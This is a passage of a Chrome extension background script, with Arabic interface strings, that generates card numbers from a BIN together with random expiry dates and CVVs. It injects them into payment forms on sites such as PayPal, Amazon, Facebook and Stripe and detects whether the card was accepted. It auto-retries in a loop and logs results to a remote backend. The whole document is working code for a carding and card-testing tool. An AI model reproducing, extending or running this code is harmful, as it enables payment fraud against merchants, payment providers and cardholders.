  chrome.tabs.create({ url: chrome.runtime.getURL('popup.html') });
});

// Execute Active Bin
async function executeActiveBin() {
  try {
    console.log('=== executeActiveBin called ===');
    console.log('Current activeBinData:', JSON.stringify(activeBinData));

    // Get current active tab
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tabs || tabs.length === 0) {
      console.error('No active tab found');
      return { success: false, error: 'لا يوجد تبويب نشط' };
    }

    const tab = tabs[0];
    console.log('Active tab URL:', tab.url);

    // Check if we're on a supported site
    if (!isSupportedSite(tab.url)) {
      console.error('Site not supported:', tab.url);
      return { success: false, error: 'الموقع غير مدعوم' };
    }

    // Generate card data if BIN is available
    if (activeBinData.bin) {
      console.log('BIN found, generating card data...');
      const cardData = generateCardData(activeBinData);
      console.log('Generated card data:', JSON.stringify(cardData));

      // Inject and execute the fill script
      await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: fillCardForm,
        args: [cardData]
      });

      console.log('Card form filled, sending immediate log...');

      // Send immediate "PENDING" result to popup
      const cardLast4 = cardData.cardNumber?.slice(-4) || '****';
      chrome.runtime.sendMessage({
        action: 'cardBindingResult',
        data: {
          card: cardLast4,
          status: 'PENDING',
          reason: 'waiting',
          bin: activeBinData.bin
        }
      }).catch(() => { });

      // Also save to storage directly for persistence
      chrome.storage.local.get(['bindingLogs', 'bindingStats'], (result) => {
        const logs = result.bindingLogs || [];
        const stats = result.bindingStats || { success: 0, failed: 0, unknown: 0 };

        logs.unshift({
          card: cardLast4,
          status: 'PENDING',
          reason: 'جاري الكشف...',
          bin: activeBinData.bin,
          time: new Date().toLocaleTimeString('ar-EG')
        });

        if (logs.length > 50) logs.pop();
        stats.unknown++;

        chrome.storage.local.set({ bindingLogs: logs, bindingStats: stats });
      });

      console.log('Starting binding detection (async)...');

      // Run detection in background (don't wait)
      chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: detectCardBindingSuccess,
        args: [cardData]
      }).then(detectionResults => {
        const detectionResult = detectionResults?.[0]?.result;
        console.log('Card binding detection result:', detectionResult);

        if (detectionResult) {
          const status = detectionResult.success === true ? 'SUCCESS' :
            detectionResult.success === false ? 'FAILED' : 'UNKNOWN';

          // Update in Appwrite
          sendToBackend('CARD_BINDING', {
            cardLast4: detectionResult.card,
            status: status,
            reason: detectionResult.reason,
            bin: activeBinData.bin,
            time: new Date().toISOString()
          });

          // Update popup
          chrome.runtime.sendMessage({
            action: 'cardBindingResult',
            data: {
              card: detectionResult.card,
              status: status,
              reason: detectionResult.reason,
              bin: activeBinData.bin,
              updatePending: true // Flag to update last pending entry
            }
          }).catch(() => { });

          console.log(`Card binding ${status}: ${detectionResult.reason}`);
        }
      }).catch(err => {
        console.error('Detection error:', err);
      });

      return { success: true, message: 'تم ملء النموذج بنجاح' };
    } else {
      console.error('No BIN set in activeBinData');
      // Try to reload from storage
      const result = await chrome.storage.local.get(['activeBinData']);
      console.log('Reloaded from storage:', result);
      if (result.activeBinData?.bin) {
        activeBinData = result.activeBinData;
        console.log('Retrying with reloaded data...');
        return executeActiveBin(); // Retry with reloaded data
      }
      return { success: false, error: 'لم يتم تعيين BIN نشط' };
    }
  } catch (error) {
    console.error('Execute active bin error:', error);
    return { success: false, error: error.message };
  }
}


// Execute Decline Bin
async function executeDeclineBin() {
  try {
    // Get current active tab
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (!tabs || tabs.length === 0) {
      return { success: false, error: 'لا يوجد تبويب نشط' };
    }

    const tab = tabs[0];

    // Check if we're on a supported site
    if (!isSupportedSite(tab.url)) {
      return { success: false, error: 'الموقع غير مدعوم' };
    }

    // Generate card data if BIN is available
    if (declineBinData.bin) {
      const cardData = generateCardData(declineBinData);

      // Inject and execute the script
      await chrome.scripting.executeScript({
        target: { tabId: tab.id },
        func: fillCardForm,
        args: [cardData]
      });

      return { success: true, message: 'تم ملء النموذج بنجاح' };
    } else {
      return { success: false, error: 'لم يتم تعيين BIN مرفوض' };
    }
  } catch (error) {
    console.error('Execute decline bin error:', error);
    return { success: false, error: error.message };
  }
}

// Check if site is supported
function isSupportedSite(url) {
  const supportedDomains = [
    'facebook.com',
    'fb.com',
    'instagram.com',
    'twitter.com',
    'x.com',
    'tiktok.com',
    'snapchat.com',
    'whatsapp.com',
    'discord.com',
    'youtube.com',
    'google.com',
    'gmail.com',
    'outlook.com',
    'hotmail.com',
    'yahoo.com',
    'amazon.com',
    'ebay.com',
    'paypal.com',
    'stripe.com',
    'shopify.com',
    'woocommerce.com',
    'magento.com',
    'prestashop.com',
    'opencart.com',
    'zencart.com',
    'oscommerce.com',
    'xtcommerce.com',
    'loadedcommerce.com',
    'creloaded.com',
    'zencart.com',
    'oscommerce.com',
    'xtcommerce.com',
    'loadedcommerce.com',
    'creloaded.com'
  ];

  try {
    const urlObj = new URL(url);
    return supportedDomains.some(domain => urlObj.hostname.includes(domain));
  } catch (error) {
    return false;
  }
}

// Generate card data from BIN
function generateCardData(binData) {
  const bin = binData.bin;
  const expiryDate = binData.expiryDate;
  const cvv = binData.cvv;

  // Generate random card number if BIN contains X
  let cardNumber = bin;
  if (bin.includes('X')) {
    const remainingLength = 16 - bin.length;
    for (let i = 0; i < remainingLength; i++) {
      cardNumber += Math.floor(Math.random() * 10);
    }
  }

  // Generate random expiry date if not provided
  let finalExpiryDate = expiryDate;
  if (!finalExpiryDate) {
    const currentYear = new Date().getFullYear();
    const month = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
    const year = String(currentYear + Math.floor(Math.random() * 5) + 1).slice(-2);
    finalExpiryDate = `${month}/${year}`;
  }

  // Generate random CVV if not provided
  let finalCvv = cvv;
  if (!finalCvv) {
    finalCvv = String(Math.floor(Math.random() * 900) + 100);
  }

  return {
    cardNumber: cardNumber.replace(/\s/g, ''),
    expiryDate: finalExpiryDate,
    cvv: finalCvv
  };
}

// Fill card form function (injected into page)
function fillCardForm(cardData) {
  try {
    // Common card input selectors
    const cardSelectors = [
      'input[name*="card"]',
      'input[name*="number"]',
      'input[name*="cc"]',
      'input[name*="credit"]',
      'input[name*="debit"]',
      'input[placeholder*="card"]',
      'input[placeholder*="number"]',
      'input[placeholder*="cc"]',
      'input[placeholder*="credit"]',
      'input[placeholder*="debit"]',
      'input[type="text"][maxlength="16"]',
      'input[type="text"][maxlength="19"]'
    ];

    const expirySelectors = [
      'input[name*="expiry"]',
      'input[name*="exp"]',
      'input[name*="month"]',
      'input[name*="year"]',
      'input[placeholder*="expiry"]',
      'input[placeholder*="exp"]',
      'input[placeholder*="MM/YY"]',
      'input[placeholder*="MM/YYYY"]'
    ];

    const cvvSelectors = [
      'input[name*="cvv"]',
      'input[name*="cvc"]',
      'input[name*="security"]',
      'input[placeholder*="cvv"]',
      'input[placeholder*="cvc"]',
      'input[placeholder*="security"]',
      'input[type="text"][maxlength="3"]',
      'input[type="text"][maxlength="4"]'
    ];

    // Fill card number
    for (const selector of cardSelectors) {
      const inputs = document.querySelectorAll(selector);
      for (const input of inputs) {
        if (input.offsetParent !== null && input.type !== 'hidden') {
          input.value = cardData.cardNumber;
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
          break;
        }
      }
    }

    // Fill expiry date
    for (const selector of expirySelectors) {
      const inputs = document.querySelectorAll(selector);
      for (const input of inputs) {
        if (input.offsetParent !== null && input.type !== 'hidden') {
          input.value = cardData.expiryDate;
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
          break;
        }
      }
    }

    // Fill CVV
    for (const selector of cvvSelectors) {
      const inputs = document.querySelectorAll(selector);
      for (const input of inputs) {
        if (input.offsetParent !== null && input.type !== 'hidden') {
          input.value = cardData.cvv;
          input.dispatchEvent(new Event('input', { bubbles: true }));
          input.dispatchEvent(new Event('change', { bubbles: true }));
          break;
        }
      }
    }

    return { success: true, message: 'تم ملء النموذج بنجاح' };
  } catch (error) {
    console.error('Fill form error:', error);
    return { success: false, error: error.message };
  }
}

// Card binding success detection function (injected into page)
function detectCardBindingSuccess(cardData) {
  return new Promise((resolve) => {
    console.log('Starting card binding detection for:', cardData.cardNumber?.slice(-4));

    // Store initial state
    const initialUrl = window.location.href;
    const initialCardInputs = document.querySelectorAll('input[name*="card"], input[name*="number"], input[name*="cc"]');
    const initialInputCount = initialCardInputs.length;
    let hasResolved = false;

    // Success indicators
    const successTexts = ['تم', 'success', 'تمت', 'done', 'added', 'saved', 'confirmed', 'thank you', 'شكراً'];
    const errorTexts = ['error', 'failed', 'invalid', 'declined', 'rejected', 'خطأ', 'فشل', 'مرفوض'];

    function checkForSuccess() {
      if (hasResolved) return;

      // Check 1: URL changed (often indicates success/redirect)
      if (window.location.href !== initialUrl) {
        console.log('✅ Card binding SUCCESS detected: URL changed');
        hasResolved = true;
        resolve({ success: true, reason: 'url_changed', card: cardData.cardNumber?.slice(-4) });
        return;
      }

      // Check 2: Card input fields disappeared
      const currentCardInputs = document.querySelectorAll('input[name*="card"], input[name*="number"], input[name*="cc"]');
      const visibleInputs = Array.from(currentCardInputs).filter(i => i.offsetParent !== null);
      if (initialInputCount > 0 && visibleInputs.length === 0) {
        console.log('✅ Card binding SUCCESS detected: Input fields disappeared');
        hasResolved = true;
        resolve({ success: true, reason: 'fields_disappeared', card: cardData.cardNumber?.slice(-4) });
        return;
      }

      // Check 3: Success message appeared
      const pageText = document.body.innerText.toLowerCase();
      for (const text of successTexts) {
        if (pageText.includes(text)) {
          // Make sure it's not an error too
          let hasError = false;
          for (const errText of errorTexts) {
            if (pageText.includes(errText)) {
              hasError = true;
              break;
            }
          }
          if (!hasError) {
            console.log('✅ Card binding SUCCESS detected: Success message found');
            hasResolved = true;
            resolve({ success: true, reason: 'success_message', card: cardData.cardNumber?.slice(-4) });
            return;
          }
        }
      }

      // Check 4: Error message appeared
      for (const text of errorTexts) {
        if (pageText.includes(text)) {
          console.log('❌ Card binding FAILED detected: Error message found');
          hasResolved = true;
          resolve({ success: false, reason: 'error_message', card: cardData.cardNumber?.slice(-4) });
          return;
        }
      }
    }

    // Use MutationObserver to watch for DOM changes
    const observer = new MutationObserver((mutations) => {
      checkForSuccess();
    });

    observer.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: true,
      characterData: true
    });

    // Also check periodically
    const checkInterval = setInterval(checkForSuccess, 500);

    // Timeout after 15 seconds
    setTimeout(() => {
      if (!hasResolved) {
        observer.disconnect();
        clearInterval(checkInterval);
        console.log('⏱️ Card binding detection timeout - no clear result');
        resolve({ success: null, reason: 'timeout', card: cardData.cardNumber?.slice(-4) });
      }
    }, 15000);

    // Clean up observer after resolution
    const originalResolve = resolve;
    resolve = (result) => {
      observer.disconnect();
      clearInterval(checkInterval);
      originalResolve(result);
    };
  });
}

// Update BIN data
function updateBinData(data) {
  if (data.activeBinData) {
    activeBinData = { ...activeBinData, ...data.activeBinData };
  }
  if (data.declineBinData) {
    declineBinData = { ...declineBinData, ...data.declineBinData };
  }
  saveData();
}

// Auto try functions
function startAutoTry(interval, maxCount) {
  if (isAutoTrying) return;

  isAutoTrying = true;
  autoTryCount = 0;
  maxAutoTryCount = maxCount || 19;

  autoTryInterval = setInterval(async () => {
    if (autoTryCount >= maxAutoTryCount) {
      stopAutoTry();
      return;
    }

    autoTryCount++;
    const result = await executeActiveBin();
    console.log(`Auto try ${autoTryCount}/${maxAutoTryCount}:`, result);
  }, (interval || 3) * 1000);
}

function stopAutoTry() {
  if (autoTryInterval) {
    clearInterval(autoTryInterval);
    autoTryInterval = null;
  }
  isAutoTrying = false;
  autoTryCount = 0;
}

// === آلية الحفاظ على الباكند نشطاً ===
async function pingBackend() {
  try {
    console.log('🔄 إرسال ping للباكند من Background Script...');
    const startTime = Date.now();

    // Ping Appwrite backend
    const authResponse = await fetch(`${APPWRITE_CONFIG.endpoint}/health`, {
      method: 'GET',
      headers: getAppwriteHeaders()
    });

    const endTime = Date.now();
    const responseTime = endTime - startTime;

    if (authResponse.ok) {
      connectionStatus = 'connected';
      lastPingTime = new Date().toLocaleTimeString('ar-SA');
      console.log(`✅ الباكند نشط - وقت الاستجابة: ${responseTime}ms`);
    } else {
      connectionStatus = 'disconnected';
      console.warn('⚠️ الباكند لا يستجيب بشكل صحيح');
    }
  } catch (error) {
    connectionStatus = 'disconnected';
    console.error('❌ خطأ في الاتصال بالباكند:', error.message);
  }
}


function startKeepAlivePing() {
  // إيقاف أي interval سابق
  if (keepAliveInterval) {
    clearInterval(keepAliveInterval);
  }

  // ping فوري عند بدء التطبيق
  pingBackend();

  // ping كل 5 دقائق (300000 مللي ثانية)
  keepAliveInterval = setInterval(pingBackend, 300000);

  console.log('🚀 بدأت آلية الحفاظ على الباكند نشطاً من Background Script (كل 5 دقائق)');
}

function stopKeepAlivePing() {
  if (keepAliveInterval) {
    clearInterval(keepAliveInterval);
    keepAliveInterval = null;
    console.log('⏹️ توقفت آلية الحفاظ على الباكند نشطاً من Background Script');
  }
}

// Service Worker functions are available through chrome.runtime.sendMessage
// No window object in Service Workers